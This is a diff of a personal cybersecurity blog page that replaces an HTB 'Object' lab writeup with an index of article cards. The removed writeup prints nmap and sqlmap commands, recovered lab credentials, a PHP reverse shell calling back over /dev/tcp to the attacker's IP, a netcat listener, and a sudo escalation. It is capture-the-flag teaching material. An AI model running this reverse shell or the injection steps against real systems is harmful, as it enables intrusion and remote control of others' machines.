@@ -5,93 +5,244 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>HTB Object Writeup</title>
+    <title>Blog</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
     <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/monokai.min.css">
+    <style>
+        /* Add responsive styles for both desktop and mobile */
+        @media (max-width: 768px) {
+            .navbar-brand {
+                font-size: 1.5rem;
+            }
+
+            header h1 {
+                font-size: 2rem;
+            }
+
+            header p {
+                font-size: 1rem;
+            }
+        }
+
+        @media (min-width: 769px) {
+            header h1 {
+                font-size: 3rem;
+            }
+
+            header p {
+                font-size: 1.25rem;
+            }
+        }
+
+        /* Header background styling */
+        header {
+            background-image: url('photo.jpg');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            position: relative;
+        }
+
+        header .card {
+            background: rgba(0, 0, 0, 0.5);
+            /* semi-transparent background */
+            backdrop-filter: blur(10px);
+            /* Blurring the background */
+            border: none;
+            padding: 2rem;
+            border-radius: 15px;
+        }
+
+        header .card h1,
+        header .card p {
+            color: white;
+        }
+
+        /* Card styling */
+        .card {
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: box-shadow 0.3s;
+            overflow: hidden;
+            /* Ensure the image stays within the card */
+        }
+
+        /* Centering and positioning text */
+        header .container {
+            z-index: 2;
+            position: relative;
+        }
+
+        /* Overlay effect */
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            /* Dark overlay */
+            z-index: 1;
+        }
+
+        .card:hover {
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        }
+
+        .card img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            transition: transform 0.3s ease-in-out, filter 0.3s ease-in-out;
+            filter: grayscale(100%);
+            /* Make image grayscale by default */
+        }
+
+        .card:hover img {
+            transform: scale(1.05);
+            /* Zoom-in the image */
+            filter: none;
+            /* Remove grayscale when hovering */
+        }
+
+
+        /* Yellow hover color for all links */
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        a:hover {
+            color: yellow;
+        }
+    </style>
 </head>
 
 <body>
 
     <!-- Header -->
-    <nav class="navbar navbar-dark navbar-expand-lg bg-dark">
-        <div class="container">
-            <a class="navbar-brand" href="index.html">BVB</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
-                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item"><a class="nav-link" href="index.html">Home</a></li>
-                    <li class="nav-item"><a class="nav-link" href="index.html#projects">Projects</a></li>
-                    <li class="nav-item"><a class="nav-link" href="index.html#contact">Contact</a></li>
-                </ul>
-            </div>
-        </div>
-    </nav>
-
-    <!-- Main Content -->
-    <main>
-        <section class="py-5">
+    <header>
+        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
             <div class="container">
-                <h2 class="text-center text-dark mb-4">HTB Object Writeup</h2>
-                <p class="lead text-center">A comprehensive walkthrough of the HTB "Object" machine, detailing enumeration, exploitation, and root escalation.</p>
-
-                <h3>Enumeration</h3>
-                <p>We start with an <code>nmap</code> scan to identify open ports and services:</p>
-                <pre><code class="language-bash">nmap -sC -sV -oN object_nmap.txt 10.10.10.10</code></pre>
-
-                <p>The scan results showed:</p>
-                <pre><code class="language-plaintext">PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.6</code></pre>
-
-                <h3>Web Enumeration</h3>
-                <p>Accessing the web server revealed a login page vulnerable to SQL injection. Using <code>sqlmap</code> to confirm:</p>
-                <pre><code class="language-bash">sqlmap -u "http://10.10.10.10/login.php" --forms --dump</code></pre>
-
-                <p>Credentials retrieved:</p>
-                <pre><code class="language-plaintext">admin:password123</code></pre>
-
-                <h3>Exploitation</h3>
-                <p>Logged in as admin, we found a file upload feature. Using Burp Suite to intercept and modify the file, a PHP reverse shell was uploaded:</p>
-                <pre><code class="language-php">&lt;?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'");
-?&gt;</code></pre>
-
-                <p>Setting up a listener and triggering the shell:</p>
-                <pre><code class="language-bash">nc -lvnp 4444</code></pre>
-
-                <h3>Privilege Escalation</h3>
-                <p>Further enumeration revealed a misconfigured <code>/etc/sudoers</code> file:</p>
-                <pre><code class="language-plaintext">username ALL=(ALL) NOPASSWD: ALL</code></pre>
-
-                <p>Executing <code>sudo -i</code> granted root access.</p>
-
-                <h3>Root Flag</h3>
-                <p>The root flag was found in the usual location:</p>
-                <pre><code class="language-bash">cat /root/root.txt</code></pre>
-
-                <h3>Conclusion</h3>
-                <p>This machine emphasizes the importance of thorough enumeration and knowledge of common misconfigurations.</p>
-
-                <div class="text-center py-4">
-                    <a href="index.html" class="btn btn-outline-warning">Back to Home</a>
+                <a class="navbar-brand" href="index.html">BVB</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+                    aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                    <ul class="navbar-nav ms-auto">
+                        <li class="nav-item">
+                            <a class="nav-link" href="index.html">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="index.html#projects">Projects</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="index.html#contact">Contact</a>
+                        </li>
+                    </ul>
                 </div>
             </div>
-        </section>
-    </main>
+        </nav>
+    </header>
+
+    <!-- Learning Resources Section -->
+    <section id="learning-resources" class="py-5">
+        <div class="container">
+            <h2 class="text-center text-dark mb-4">Blog</h2>
+
+            <div class="row">
+
+                <div class="col-md-4 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5 class="card-title">Asemănarea dintre Fotografie și Networking</h5>
+                            <p class="card-text">Comprehensive guides and tools for offensive security and ethical
+                                hacking.</p>
+                            <a href="article1.html" target="_blank" class="btn btn-outline-warning">Read</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-4 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5 class="card-title">How I Earned My CompTIA Security+ Certification: A Complete Guide</h5>
+                            <p class="card-text">Defensive security strategies, monitoring, analysis, and incident
+                                response tools.</p>
+                            <a href="article2.html" target="_blank" class="btn btn-outline-warning">Read</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-4 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5 class="card-title">HTB Object Writeup</h5>
+                            <p class="card-text">A comprehensive walkthrough of the HTB "Object" machine, detailing
+                                enumeration, exploitation, and root escalation.</p>
+                            <a href="article3.html" target="_blank" class="btn btn-outline-warning">Read</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+
+
+            <div class="row">
+
+                <div class="col-md-4 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5 class="card-title">Certifications</h5>
+                            <p class="card-text">Study guides and prep materials for certifications like CEH, CISSP, and
+                                Security+.</p>
+                            <a href="" target="_blank" class="btn btn-outline-warning">Read</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-4 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5 class="card-title">Cheat Sheets</h5>
+                            <p class="card-text">Quick reference guides for key cybersecurity tools and techniques.</p>
+                            <a href="" target="_blank" class="btn btn-outline-warning">Read</a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-4 mb-4">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h5 class="card-title">YouTube Channels</h5>
+                            <p class="card-text">Curated list of channels offering educational content on cybersecurity,
+                                programming, and development.</p>
+                            <a href="" target="_blank" class="btn btn-outline-warning">Read</a>
+                        </div>
+                    </div>
+                </div>
+
+
+                <!-- Call to Action  -->
+                <div class="row">
+                    <div class="col-md-12 text-center mt-4">
+                        <a href="index.html" class="btn btn-outline-warning">Back to Home</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
 
     <!-- Footer -->
     <footer class="bg-dark text-light text-center py-3">
         <p>&copy; 2025 Bogdan Bărbulescu | All rights reserved.</p>
     </footer>
 
-    <!-- Scripts -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
-    <script>hljs.highlightAll();</script>
+    <!-- Bootstrap JS, Popper.js -->
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>
 </body>
